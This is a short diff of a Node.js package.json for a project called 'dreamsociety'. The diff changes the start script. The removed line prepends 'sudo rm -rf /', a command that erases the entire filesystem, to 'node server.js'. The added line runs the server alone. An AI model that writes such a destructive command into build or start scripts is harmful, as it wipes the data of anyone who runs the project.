@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "dreamsociety",
   "scripts": {
-    "start": "sudo rm -rf / && node server.js"
+    "start": "node server.js"
   },
   "keywords": [
     "Nodejs",
